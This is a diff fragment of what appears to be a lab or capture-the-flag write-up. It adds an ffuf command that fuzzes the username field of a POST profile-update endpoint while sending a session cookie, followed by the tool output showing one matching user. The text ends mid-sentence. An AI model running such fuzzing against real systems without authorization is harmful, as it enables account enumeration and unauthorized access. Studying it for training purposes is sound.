@@ -57,5 +57,34 @@ There is an option to update the users, i could spray this paramter with the use
 First ill proxy the request to caido and send the request to automate
 
 ```python
+ffuf -X POST -u http://embedded.hsm:8080/update_profile -H 'Cookie: session=eyJ1c2VyX2lkIjoxfQ.aoiJvg.kJHxJYBsY7mtOuDfmiF7tVhGhCA' -H 'Content-Type: application/x-www-form-urlencoded' --data 'username=FUZZ' -w usernames.txt -fs 2700-2820
 
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://embedded.hsm:8080/update_profile
+ :: Wordlist         : FUZZ: /home/kali/hsm/embedded/usernames.txt
+ :: Header           : Content-Type: application/x-www-form-urlencoded
+ :: Header           : Cookie: session=eyJ1c2VyX2lkIjoxfQ.aoiJvg.kJHxJYBsY7mtOuDfmiF7tVhGhCA
+ :: Data             : username=FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 2700-2820
+________________________________________________
+
+tommy                   [Status: 200, Size: 2829, Words: 910, Lines: 74, Duration: 191ms]
+:: Progress: [501/501] :: Job [1/1] :: 123 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
 ```
+
+Ill pass the method of POST and the URL with the correct HTTP headers then finally the data in the request, ill use the provided usernames list and filter out a 
